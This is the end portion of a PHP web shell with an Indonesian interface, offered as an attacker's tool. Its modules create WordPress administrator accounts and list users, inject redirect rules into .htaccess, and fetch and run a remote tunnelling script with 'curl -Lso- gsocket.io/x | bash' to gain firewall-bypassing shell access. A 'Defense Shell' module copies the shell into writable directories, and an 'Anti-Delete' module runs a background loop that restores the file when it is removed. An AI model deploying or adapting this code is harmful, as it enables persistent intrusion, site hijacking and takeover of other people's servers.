            elseif (trim($result) === "EXISTS") $wp_message = "<div style='color:#ff0;padding:10px;background:#3a3a0a;border-radius:4px;margin:10px 0;'>Username/email sudah ada!</div>";
            else $wp_message = "<div style='color:#f44;padding:10px;background:#3a1a1a;border-radius:4px;margin:10px 0;'>Error: $result</div>";
        }
    }

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'list') {
        $wp_path = $_POST['WHISKAS2'] ?? $default_wp;
        if (!empty($wp_path) && @file_exists($wp_path . '/wp-config.php')) {$result = $executeWpScript($wp_path, '$users=get_users(array("orderby"=>"ID"));$d=array();foreach($users as $u){$d[]=array("id"=>$u->ID,"login"=>$u->user_login,"email"=>$u->user_email,"role"=>implode(", ",$u->roles));}echo "USERLIST:".json_encode($d);');
            if (strpos($result, "USERLIST:") === 0) {
                $users = json_decode(substr($result, 9), true);
                if (!empty($users)) {
                    $wp_message .= "<div style='margin-top:15px;'><h4 style='color:#0f0;'>User List (".count($users).")</h4>";
                    $wp_message .= "<table style='width:100%;border-collapse:collapse;'><tr style='background:#333;'><th style='padding:8px;border:1px solid #444;'>ID</th><th style='padding:8px;border:1px solid #444;'>Username</th><th style='padding:8px;border:1px solid #444;'>Email</th><th style='padding:8px;border:1px solid #444;'>Role</th></tr>";
                    foreach ($users as $u) {
                        $rc = ($u['role'] === 'administrator') ? '#f90' : '#888';
                        $wp_message .= "<tr><td style='padding:6px;border:1px solid #444;text-align:center;'>{$u['id']}</td><td style='padding:6px;border:1px solid #444;color:#4af;'>{$u['login']}</td><td style='padding:6px;border:1px solid #444;'>{$u['email']}</td><td style='padding:6px;border:1px solid #444;color:$rc;'>{$u['role']}</td></tr>";
                    }
                    $wp_message .= "</table></div>";
                }
            }
        }
    }

    echo $wp_message;
    echo '<div style="padding:30px;max-width:600px;margin:0 auto;">
    <div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128101;</span></div>
    <div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;border:1px solid #ffffff;margin-bottom:20px;">
    <h3 style="color:#FFF;margin:0 0 20px 0;font-size:18px;">Create New User</h3>
    <form onsubmit="g(\'wp_adduser\',null,\'create\',this.wp_path.value,this.username.value,this.password.value,this.email.value,this.role.value);return false;">
    <div style="margin-bottom:12px;"><label style="color:#FFF;font-size:12px;">WP Path</label><input type="text" name="wp_path" value="'.htmlspecialchars($default_wp).'" style="width:100%;padding:10px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"></div>
    <div style="display:flex;gap:10px;margin-bottom:12px;"><div style="flex:1;"><label style="color:#FFF;font-size:12px;">Username</label><input type="text" name="username" placeholder="newadmin" style="width:100%;padding:10px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"></div><div style="flex:1;"><label style="color:#888;font-size:12px;">Password</label><input type="text" name="password" placeholder="password123" style="width:100%;padding:10px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"></div></div>
    <div style="display:flex;gap:10px;margin-bottom:15px;"><div style="flex:1;"><label style="color:#FFF;font-size:12px;">Email</label><input type="email" name="email" placeholder="admin@example.com" style="width:100%;padding:10px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"></div><div style="flex:1;"><label style="color:#888;font-size:12px;">Role</label><select name="role" style="width:100%;padding:10px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"><option value="administrator">Administrator</option><option value="editor">Editor</option><option value="author">Author</option></select></div></div>
    <button type="submit" style="width:100%;padding:12px;background:linear-gradient(180deg, #85daff 0%, #53cbff 10%, #0081b9 50%, #0081b9 100%);color:#FFF;border:none;border-radius:6px;cursor:pointer;font-size:14px;font-weight:bold;">Create User</button>
    </form></div>
    <div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:20px;border-radius:12px;border:1px solid #3498db;">
    <h3 style="color:#ffffff;margin:0 0 15px 0;font-size:18px;">List Users</h3>
    <form onsubmit="g(\'wp_adduser\',null,\'list\',this.wp_path2.value);return false;" style="display:flex;gap:10px;">
    <input type="text" name="wp_path2" value="'.htmlspecialchars($default_wp).'" style="flex:1;padding:10px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;font-weight:bold;">
    <button type="submit" style="padding:10px 20px;background:linear-gradient(135deg, #00f1ff 0%, #0039eb 100%);color:#000;border:none;border-radius:6px;cursor:pointer;font-size:14px;font-weight:bold;">List</button>
    </form></div></div>';
    if (!empty($detected_paths)) {
        echo '<div style="padding:10px;color:#FFF;">Detected: ';
        foreach ($detected_paths as $dp) echo '<code style="color:#4af;margin-right:10px;">'.htmlspecialchars($dp).'</code> ';
        echo '</div>';
    }
    echo '</div>';
    WHISKASfooter();
}

// ============ REDIRECT MANAGER ============
function WHISKASredirect_manager() {
    WHISKAShead();
    echo '<div class="header"><center><p><div class="txtfont_header">| Redirect Manager |</div></p></center>';

    $htaccess = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
    if (!@file_exists($htaccess)) $htaccess = dirname(__FILE__) . '/.htaccess';

    $message = '';

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'add') {
        $from = trim($_POST['WHISKAS2'] ?? '');
        $to = trim($_POST['WHISKAS3'] ?? '');
        $code = $_POST['WHISKAS4'] ?? '301';
        if (!empty($to)) {
            $content = @file_get_contents($htaccess) ?: '';
            $rules = "\n# Redirect: $from -> $to\nRewriteEngine On\n";
            if (!empty($from)) {
                $fp = parse_url($from);
                $fh = isset($fp['host']) ? preg_replace('/^www\./', '', $fp['host']) : $from;
                $rules .= "RewriteCond %{HTTP_HOST} ^(www\\.)?{$fh}$ [NC]\n";
            }
            $rules .= "RewriteRule ^(.*)$ $to/\$1 [R=$code,L]\n";
            @file_put_contents($htaccess, $content . $rules);
            $message = "<div style='color:#0f0;padding:10px;background:#1a3a1a;border-radius:4px;margin:10px;'>Redirect berhasil ditambahkan!</div>";
        }
    }

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'delete') {
        $idx = intval($_POST['WHISKAS2']);
        $content = @file_get_contents($htaccess);
        $content = preg_replace('/# Redirect:.*?(?=# Redirect:|$)/s', '', $content, 1);
        @file_put_contents($htaccess, $content);
        $message = "<div style='color:#0f0;padding:10px;background:#1a3a1a;border-radius:4px;margin:10px;'>Redirect dihapus!</div>";
    }

    echo $message;
    echo '<div style="padding:30px;max-width:600px;margin:0 auto;">
    <div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128279;</span></div>
    <div style="background:linear-gradient(135deg, #000000 0%, #000000 100%);padding:25px;border-radius:12px;border:1.5px solid #ffffff;margin-bottom:20px;">
    <h3 style="color:#ffffff;margin:0 0 20px 0;font-size:18px;text-align:center;">Add Domain Redirect</h3>
    <form onsubmit="g(\'redirect_manager\',null,\'add\',this.from_url.value,this.to_url.value,this.code.value);return false;">
    <div style="margin-bottom:12px;"><label style="color:#888;font-size:12px;">From URL (optional)</label><input type="text" name="from_url" placeholder="https://old-domain.com" style="width:100%;padding:12px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"></div>
    <div style="text-align:center;color:#39ff14;font-size:24px;margin:10px 0;">&#8595;</div>
    <div style="margin-bottom:15px;"><label style="color:#888;font-size:12px;">To URL (required)</label><input type="text" name="to_url" placeholder="https://new-domain.com" required style="width:100%;padding:12px;background:#0a0a15;border:1px solid #333;border-radius:6px;color:#000;box-sizing:border-box;margin-top:5px;font-weight:bold;"></div>
    <div style="display:flex;gap:15px;margin-bottom:20px;justify-content:center;">
    <label style="background:#0a0a15;padding:10px 20px;border-radius:6px;cursor:pointer;border:1px solid #333;"><input type="radio" name="code" value="301" checked style="margin-right:8px;">301 Permanent</label>
    <label style="background:#0a0a15;padding:10px 20px;border-radius:6px;cursor:pointer;border:1px solid #333;"><input type="radio" name="code" value="302" style="margin-right:8px;">302 Temporary</label>
    </div>
    <button type="submit" style="width:100%;padding:12px;background:linear-gradient(135deg, #202020 0%, #292929 25%, #151515 100%);color:#FFF;border:1.5px solid #ffffff;border-radius:6px;cursor:pointer;font-size:14px;font-weight:bold;">Add Redirect</button>
    </form></div>
    <div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:20px;border-radius:12px;border:1px solid #333;">
    <h4 style="color:#0f0;margin:0 0 10px 0;">Current .htaccess</h4>
    <textarea style="width:100%;height:150px;background:#0a0a15;color:#0f0;border:1px solid #333;border-radius:6px;padding:10px;box-sizing:border-box;font-family:monospace;font-size:12px;" readonly>'.htmlspecialchars(@file_get_contents($htaccess) ?: 'File not found').'</textarea>
    <p style="color:#666;font-size:11px;margin-top:8px;">'.htmlspecialchars($htaccess).'</p>
    </div></div></div>';
    WHISKASfooter();
}

// ============ GSOCKET INSTALL ============
function WHISKASgsocket_install() {
    WHISKAShead();
    echo '<div class="header"><center><p><div class="txtfont_header">| GSocket Install |</div></p></center>';

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'install') {
        echo '<div style="padding:20px;"><p style="color:#888;">Menjalankan instalasi GSocket...</p>';
        echo '<pre style="background:#000;padding:15px;border-radius:4px;color:#0f0;max-height:400px;overflow:auto;">';
        $cmd = "curl -Lso- gsocket.io/x | bash 2>&1";
        $output = '';
        if (@function_exists('shell_exec')) $output = @shell_exec($cmd);
        elseif (@function_exists('exec')) { @exec($cmd, $out); $output = implode("\n", $out); }
        echo htmlspecialchars($output ?: 'Tidak ada output / Error');
        echo '</pre>';

        if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
            $secret = $m[1];
            echo "<div style='margin-top:15px;padding:15px;background:#1a3a1a;border-radius:4px;'>";
            echo "<p style='color:#0f0;'>GSocket Secret: <code style='color:#ff0;'>{$secret}</code></p>";
            echo "<p style='color:#888;'>Connect dengan: <code>gs-netcat -s \"{$secret}\" -i</code></p></div>";

        }
        echo '</div>';
    } else {echo '<div style="padding:30px;max-width:600px;margin:0 auto;">
        <div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:35px;border-radius:15px;border:1px solid #0f0;margin-bottom:25px;box-shadow:0 10px 30px rgba(0,255,0,0.1);">
            <div style="text-align:center;margin-bottom:20px;">
                <span style="font-size:50px;">&#128268;</span>
            </div>
            <h2 style="color:#0f0;margin:0 0 15px 0;font-size:24px;text-align:center;text-shadow:0 0 10px rgba(0,255,0,0.5);">GSocket - Secure Tunnel</h2>
            <p style="color:#bbb;margin-bottom:20px;font-size:14px;line-height:1.8;text-align:center;">Koneksi tunnel aman ke server tanpa port forwarding</p>
            <div style="display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin-top:20px;">
                <span style="background:#0f02;padding:8px 15px;border-radius:20px;color:#0f0;font-size:13px;border:1px solid #0f03;">&#10003; Bypass Firewall</span>
                <span style="background:#0f02;padding:8px 15px;border-radius:20px;color:#0f0;font-size:13px;border:1px solid #0f03;">&#10003; Enkripsi E2E</span>
                <span style="background:#0f02;padding:8px 15px;border-radius:20px;color:#0f0;font-size:13px;border:1px solid #0f03;">&#10003; No Public IP</span>
            </div>
        </div>
        <div style="text-align:center;">
            <form onsubmit="g(\'gsocket_install\',null,\'install\');return false;" style="display:inline-block;">
                <button type="submit" style="padding:15px 40px;background:linear-gradient(180deg, #ff0000 0%, #900000 50%, #a61000 100%);color:#FFF;border:1px solid #0f0;cursor:pointer;font-size:16px;font-weight:bold;border-radius:25px;white-space:nowrap;box-shadow:0 5px 20px rgba(231,76,60,0.4);transition:all 0.3s;">&#9889; INSTALL GSOCKET</button>
            </form>
        </div>
        <p style="color:#666;margin-top:25px;font-size:12px;text-align:center;">&#9888; Memerlukan akses internet dan curl</p></div>';
    }
    echo '</div>';
    WHISKASfooter();
}

// ============ DEFENSE SHELL (SPREAD) ============
function WHISKASdefense_shell() {
    WHISKAShead();
    echo '<div class="header"><center><p><div class="txtfont_header">| Defense Shell - Spread |</div></p></center>';

    $link_file = sys_get_temp_dir() . '/.shell_spread_' . md5(__FILE__) . '.log';
    $current_shell = @realpath($_SERVER['SCRIPT_FILENAME'] ?? __FILE__);

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'spread') {
        $spread_links = [];
        $max_spread = 20;
        $max_depth = 5;
        $counter = 0;

        $scan_spread = function($dir, $depth = 0) use (&$scan_spread, &$spread_links, &$counter, $max_spread, $max_depth, $current_shell) {
            if ($counter >= $max_spread || $depth >= $max_depth) return;
            $items = @scandir($dir);
            if (!$items) return;
            foreach ($items as $item) {
                if ($counter >= $max_spread) return;
                if ($item == '.' || $item == '..' || strpos($item, '.') === 0) continue;
                $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
                if (@is_dir($path)) {
                    if (@is_writable($path)) {
                        $newname = generate_random_filename_helper();
                        $target = $path . DIRECTORY_SEPARATOR . $newname;
                        if (@copy($current_shell, $target)) {
                            @chmod($target, 0644);
                            $url = get_web_url_from_path_helper($target);
                            $spread_links[] = $url;
                            $counter++;
                        }
                    }
                    $scan_spread($path, $depth + 1);
                }
            }
        };

        $start = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
        $scan_spread(rtrim($start, DIRECTORY_SEPARATOR));

        @file_put_contents($link_file, implode("\n", $spread_links) . "\n", FILE_APPEND | LOCK_EX);

        echo "<div style='padding:20px;'><p style='color:#0f0;'>Spread selesai! {$counter} file berhasil dibuat.</p>";
        if (!empty($spread_links)) {
            echo "<textarea style='width:100%;height:200px;background:#111;color:#0f0;border:1px solid #333;margin-top:10px;'>";
            echo htmlspecialchars(implode("\n", $spread_links));
            echo "</textarea>";

        }
        echo '</div>';
    } elseif (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'check') {
        $links = @file_exists($link_file) ? array_filter(array_map('trim', explode("\n", @file_get_contents($link_file)))) : [];
        echo "<div style='padding:20px;'><h4 style='color:#0f0;'>Backup Status (".count($links).")</h4>";
        if (empty($links)) echo "<p style='color:#888;'>Belum ada backup.</p>";
        else {
            echo "<table style='width:100%;border-collapse:collapse;'><tr style='background:#333;'><th style='padding:8px;border:1px solid #444;'>URL</th><th style='padding:8px;border:1px solid #444;'>Status</th></tr>";
            foreach ($links as $link) {
                $status = (strpos($link, 'http') === 0) ? '<span style="color:#0f0;">Web URL</span>' : '<span style="color:#888;">Local</span>';
                echo "<tr><td style='padding:6px;border:1px solid #444;word-break:break-all;'><code>$link</code></td><td style='padding:6px;border:1px solid #444;'>$status</td></tr>";
            }
            echo "</table>";
        }
        echo '</div>';
    } elseif (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'clean') {
        @unlink($link_file);
        echo "<div style='padding:20px;color:#0f0;'>Log file dibersihkan!</div>";
    } else {
        $backup_count = @file_exists($link_file) ? count(array_filter(explode("\n", @file_get_contents($link_file)))) : 0;
        echo '<div style="padding:30px;max-width:500px;margin:0 auto;">
        <div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128737;</span></div>
        <h2 style="color:#1eff00;text-align:center;margin-bottom:10px;text-shadow:0 0 10px rgba(39,174,96,0.5);">Defense Shell</h2>
        <p style="color:#888;text-align:center;margin-bottom:20px;">Akses Menyebar untuk backup otomatis</p>
        <div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;border:1px solid #ffffff;">
        <div style="text-align:center;margin-bottom:20px;padding:15px;background:#0a0a15;border:1px solid #0f0;border-radius:8px;"><span style="color:#888;">Total Backups:</span> <span style="color:#27ae60;font-size:24px;font-weight:bold;">'.$backup_count.'</span></div>
        <div style="display:flex;flex-direction:column;gap:12px;">
        <form onsubmit="g(\'defense_shell\',null,\'spread\');return false;" style="margin:0;"><button type="submit" style="width:100%;padding:14px;background:linear-gradient(135deg, #1fff00 0%, #005a26 100%);color:#FFF;border:1px solid #0f0;cursor:pointer;font-size:15px;border-radius:8px;font-weight:bold;">Akses Menyebar</button></form>
        <form onsubmit="g(\'defense_shell\',null,\'check\');return false;" style="margin:0;"><button type="submit" style="width:100%;padding:14px;background:linear-gradient(135deg, #00f1ff 0%, #0039eb 100%);color:#FFF;border:1px solid #00f8ff;cursor:pointer;font-size:15px;border-radius:8px;font-weight:bold;">Check Backups</button></form>
        <form onsubmit="g(\'defense_shell\',null,\'clean\');return false;" style="margin:0;"><button type="submit" style="width:100%;padding:14px;background:linear-gradient(180deg, #ff0000 0%, #900000 50%, #a61000 100%);color:#FFF;border:1px solid #ff0000;cursor:pointer;font-size:15px;border-radius:8px;font-weight:bold;">Clean Log</button></form>
        </div></div></div>';
    }
    echo '</div>';
    WHISKASfooter();
}

// ============ ANTI-DELETE ============
function WHISKASantidelete() {
    WHISKAShead();
    echo '<div class="header"><center><p><div class="txtfont_header">| Anti-Delete |</div></p></center>';

    $shell_path = @realpath($_SERVER['SCRIPT_FILENAME'] ?? __FILE__);
    $pid_file = sys_get_temp_dir() . '/.antidelete_' . md5($shell_path) . '.pid';
    $log_file = sys_get_temp_dir() . '/.antidelete_' . md5($shell_path) . '.log';

    // Check if running
    $is_running =false;
    $pid = null;
    if (@file_exists($pid_file)) {
        $pid = trim(@file_get_contents($pid_file));
        if ($pid && (@file_exists("/proc/$pid") || stripos(PHP_OS, 'WIN') !== false)) {
            $is_running = true;
        }
    }

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'start') {
        if (!$is_running) {
            $script = sys_get_temp_dir() . '/.antidelete_' . md5($shell_path) . '.sh';
            $content = '#!/bin/bash
SHELL_PATH="' . $shell_path . '"
PID_FILE="' . $pid_file . '"
LOG_FILE="' . $log_file . '"
echo $$ > "$PID_FILE"
ORIGINAL=$(cat "$SHELL_PATH" 2>/dev/null)
while true; do
    TS=$(date +"%Y-%m-%d %H:%M:%S")
    if [ ! -f "$SHELL_PATH" ]; then
        echo "$TS: Restored (deleted)" >> "$LOG_FILE"
        echo "$ORIGINAL" > "$SHELL_PATH"
        chmod 644 "$SHELL_PATH"
    else
        CURRENT=$(cat "$SHELL_PATH" 2>/dev/null)
        if [ "$CURRENT" != "$ORIGINAL" ]; then
            echo "$TS: Restored (modified)" >> "$LOG_FILE"
            echo "$ORIGINAL" > "$SHELL_PATH"
        fi
    fi
    sleep 5
done';
            @file_put_contents($script, $content);
            @chmod($script, 0755);
            @exec("nohup bash " . escapeshellarg($script) . " > /dev/null 2>&1 &");
            sleep(2);
            $is_running = @file_exists($pid_file);
            if ($is_running) {
            }
        }
        echo "<script>g('antidelete',null);</script>";
        return;
    }

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'stop') {
        if (@file_exists($pid_file)) {
            $pid = trim(@file_get_contents($pid_file));
            if ($pid) {
                @exec("kill $pid 2>/dev/null");
                @exec("kill -9 $pid 2>/dev/null");
            }
            @unlink($pid_file);
            @unlink(sys_get_temp_dir() . '/.antidelete_' . md5($shell_path) . '.sh');
        }
        echo "<script>g('antidelete',null);</script>";
        return;
    }

    echo '<div style="padding:30px;max-width:500px;margin:0 auto;">';
    echo '<div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128274;</span></div>';
    echo '<h2 style="color:#FFF;text-align:center;margin-bottom:20px;text-shadow:0 0 10px rgb(255 255 255 / 50%);">Anti</h2>';
    echo '<div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;border:1px solid #FFF;">';
    echo '<div style="text-align:center;padding:15px;background:#0a0a15;border:1px solid #27ae60;border-radius:8px;margin-bottom:20px;"><span style="color:#888;font-size:12px;">Protected File</span><br><code style="color:#3498db;font-size:14px;">'.htmlspecialchars(basename($shell_path)).'</code></div>';

    if ($is_running) {
        echo '<div style="text-align:center;padding:20px;background:#1a3a1a;border-radius:8px;margin-bottom:20px;border:1px solid #27ae60;"><span style="color:#27ae60;font-size:28px;">&#9679;</span><p style="color:#27ae60;font-size:20px;margin:10px 0;font-weight:bold;">AKTIF</p><p style="color:#888;font-size:12px;">PID: '.$pid.' | Auto-restore setiap 5 detik</p></div>';
        echo '<form onsubmit="g(\'antidelete\',null,\'stop\');return false;"><button type="submit" style="width:100%;padding:14px;background:linear-gradient(180deg, #ff0000 0%, #900000 50%, #a61000 100%);color:#FFF;border:1px solid #0f0;cursor:pointer;font-size:15px;border-radius:8px;font-weight:bold;">Stop Protection</button></form>';
    } else {
        echo '<div style="text-align:center;padding:20px;background:#2a2a2a;border-radius:8px;margin-bottom:20px;border:1px solid #555;"><span style="color:#888;font-size:28px;">&#9675;</span><p style="color:#888;font-size:20px;margin:10px 0;font-weight:bold;">TIDAK AKTIF</p><p style="color:#666;font-size:12px;">Shell tidak terlindungi</p></div>';
        echo '<form onsubmit="g(\'antidelete\',null,\'start\');return false;"><button type="submit" style="width:100%;padding:14px;background:linear-gradient(135deg, #1fff00 0%, #005a26 100%);color:#FFF;border:none;cursor:pointer;font-size:15px;border-radius:8px;font-weight:bold;">Aktifkan Protection</button></form>';
    }
    echo '</div>';

    if (@file_exists($log_file)) {
        $log = @file_get_contents($log_file);
        if (!empty($log)) {
            $lines = array_slice(array_filter(explode("\n", $log)), -10);
            echo '<div style="margin-top:20px;"><p style="color:#888;">Log terakhir:</p>';
            echo '<pre style="background:#000;padding:10px;border-radius:4px;color:#0f0;max-height:150px;overflow:auto;">'.htmlspecialchars(implode("\n", $lines)).'</pre></div>';
        }
    }
    echo '</div></div>';
    WHISKASfooter();
}

// ============ SHELL FINDER ============
function WHISKASshell_finder() {
    WHISKAShead();
    echo '<div class="header">';

    $keywords = ['eval(', 'base64_decode(', 'system(', 'shell_exec(', 'passthru(', 'exec(', 'proc_open(', '$_POST', '$_GET', '$_REQUEST'];
    $current_shell = @realpath($_SERVER['SCRIPT_FILENAME'] ?? __FILE__);
    $source_content = @file_get_contents($current_shell);

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'scan') {
        $start_dir = $_POST['WHISKAS2'] ?? ($_SERVER['DOCUMENT_ROOT'] ?? getcwd());
        $max_depth = intval($_POST['WHISKAS3'] ?? 5);
        $found = [];
        $scanned_dirs = 0;
        $scanned_files = 0;

        $scan = function($dir, $depth = 0) use (&$scan, &$found, &$scanned_dirs, &$scanned_files, $max_depth, $keywords, $current_shell, $source_content) {
            if ($max_depth > 0 && $depth >= $max_depth) return;
            $scanned_dirs++;
            $items = @scandir($dir);
            if (!$items) return;
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
                if (@is_dir($path)) {
                    if (@realpath($path) != @realpath(dirname($path))) $scan($path, $depth + 1);
                } elseif (preg_match('/\.(php|phtml)$/i', $item)) {
                    $scanned_files++;
                    $content = @file_get_contents($path);
                    if ($content === $source_content) continue;
                    $resolved = @realpath($path) ?: $path;
                    if ($resolved === $current_shell) continue;
                    foreach ($keywords as $kw) {
                        if (stripos($content, $kw) !== false) {
                            $url = get_web_url_from_path_helper($resolved);
                            $found[] = ['path' => $path, 'url' => $url, 'match' => $kw];
                            break;
                        }
                    }
                }
            }
        };

        $start_dir = @realpath($start_dir) ?: $start_dir;
        $start_time = microtime(true);
        $scan(rtrim($start_dir, DIRECTORY_SEPARATOR));
        $duration = round(microtime(true) - $start_time, 2);

        echo '<div style="padding:30px;max-width:900px;margin:0 auto;">';
        echo '<div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128202;</span></div>';
        echo '<h2 style="color:#39ff14;text-align:center;margin-bottom:25px;text-shadow:0 0 10px rgba(155,89,182,0.5);">Scan Results</h2>';
        echo "<div style='background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;margin-bottom:20px;border:1px solid #39ff14;box-shadow:0 8px 25px rgba(155,89,182,0.15);'>";
        echo "<div style='display:flex;justify-content:space-around;text-align:center;flex-wrap:wrap;gap:15px;'>";
        echo "<div style='background:#0d0d1a;padding:20px 30px;border-radius:10px;border:1px solid #444;'><div style='font-size:28px;color:#39ff14;font-weight:bold;'>{$scanned_dirs}</div><div style='color:#888;font-size:12px;margin-top:5px;'>&#128193; Folders</div></div>";
        echo "<div style='background:#0d0d1a;padding:20px 30px;border-radius:10px;border:1px solid #444;'><div style='font-size:28px;color:#3498db;font-weight:bold;'>{$scanned_files}</div><div style='color:#888;font-size:12px;margin-top:5px;'>&#128196; PHP Files</div></div>";
        echo "<div style='background:#0d0d1a;padding:20px 30px;border-radius:10px;border:1px solid #444;'><div style='font-size:28px;color:#2ecc71;font-weight:bold;'>{$duration}s</div><div style='color:#888;font-size:12px;margin-top:5px;'>&#9201; Duration</div></div>";
        echo "</div></div>";

        if (empty($found)) {
            echo "<div style='background:linear-gradient(135deg,#1e3a1e 0%,#0d2d0d 100%);padding:30px;border-radius:12px;text-align:center;border:1px solid #39ff14;'>";
            echo "<span style='font-size:50px;'>&#9989;</span>";
            echo "<p style='color:#2ecc71;font-size:18px;margin-top:15px;font-weight:bold;'>Tidak ada file shell mencurigakan ditemukan!</p>";
            echo "</div>";
        } else {
            $web_shells = array_filter($found, function($s) { return strpos($s['url'], 'http') === 0; });
            echo "<div style='background:linear-gradient(135deg, #b60e0e 0%, #440101 100%);padding:20px;border-radius:12px;text-align:center;margin-bottom:20px;border:1px solid #ff1800;'>";
            echo "<span style='font-size:40px;'>&#9888;</span>";
            echo "<p style='color:#FFF;font-size:18px;margin-top:10px;font-weight:bold;'>Ditemukan ".count($found)." file mencurigakan!</p>";
            echo "</div>";

            echo "<div style='background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;margin-bottom:20px;border:1px solid #00ff07;'>";
            echo "<h4 style='color:#2ecc71;margin:0 0 15px 0;'>&#127760; Web URLs:</h4>";
            echo "<textarea style='width:100%;height:120px;background:#0d0d1a;color:#2ecc71;border:1px solid #333;border-radius:8px;padding:12px;font-family:monospace;box-sizing:border-box;resize:vertical;'>";
            foreach ($web_shells as $s) echo $s['url'] . "\n";
            echo "</textarea></div>";

            echo "<div style='background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;border:1px solid #00ff07;'>";
            echo "<h4 style='color:#ffe800;margin:0 0 15px 0;'>&#128203; Detail Found:</h4>";
            echo "<div style='overflow-x:auto;'><table style='width:100%;border-collapse:collapse;font-size:13px;'><tr style='background:#0d0d1a;'><th style='padding:12px;border:1px solid #333;color:#39ff14;text-align:left;'>Path</th><th style='padding:12px;border:1px solid #333;color:#39ff14;text-align:left;width:120px;'>Keyword</th></tr>";
            foreach ($found as $s) {
                echo "<tr style='background:#0a0a15;'><td style='padding:10px 12px;border:1px solid #333;word-break:break-all;'><code style='color:#3498db;'>{$s['path']}</code></td><td style='padding:10px 12px;border:1px solid #333;color:#ffe800;font-weight:bold;'>{$s['match']}</td></tr>";
            }
            echo "</table></div></div>";
        }
        echo '</div>';
    } else {
        $default_dir = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '') ?: getcwd();
        echo '<div style="padding:30px;max-width:600px;margin:0 auto;">
        <div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128270;</span></div>
        <h2 style="color:#39ff14;text-align:center;margin-bottom:10px;text-shadow:0 0 10px rgba(155,89,182,0.5);">Shell Finder</h2>
        <p style="color:#888;text-align:center;margin-bottom:25px;font-size:13px;">Scan directory untuk mencari file PHP yang mencurigakan</p>
        <div style="background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;border:1px solid #39ff14;box-shadow:0 8px 25px rgba(155,89,182,0.15);">
        <form onsubmit="g(\'shell_finder\',null,\'scan\',this.start_dir.value,this.depth.value);return false;">
        <div style="margin-bottom:20px;">
            <label style="display:block;color:#39ff14;margin-bottom:8px;font-weight:bold;">&#128193; Start Directory</label>
            <input type="text" name="start_dir" value="'.htmlspecialchars($default_dir).'" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #39ff14;border-radius:8px;color:#000;font-size:14px;box-sizing:border-box;font-weight:bold;">
        </div>
        <div style="margin-bottom:25px;">
            <label style="display:block;color:#39ff14;margin-bottom:8px;font-weight:bold;">&#128202; Scan Depth</label>
            <select name="depth" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #39ff14;border-radius:8px;color:#000;font-size:14px;font-weight:bold;">
                <option value="0">Unlimited (Full Scan)</option>
                <option value="3">3 Level</option>
                <option value="5" selected>5 Level (Recommended)</option>
                <option value="10">10 Level</option>
            </select>
        </div>
        <button type="submit" style="width:100%;padding:14px;background:linear-gradient(135deg, #39ff14 0%, #0b7e00 100%);color:#FFF;border:1px solid #39ff14;cursor:pointer;font-size:16px;border-radius:8px;font-weight:bold;transition:all 0.3s ease;box-shadow:0 4px 15px rgba(155,89,182,0.3);">&#128269; START SCAN</button>
        </form>
        </div>
        </div>';
    }echo '</div>';
    WHISKASfooter();
}

if(empty($_POST['a']))
if(isset($default_action) && function_exists('WHISKAS' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan2';//'FilesMan';
if(!empty($_POST['a']) && function_exists('WHISKAS' . $_POST['a']))
call_user_func('WHISKAS' . $_POST['a']);
exit;
?>
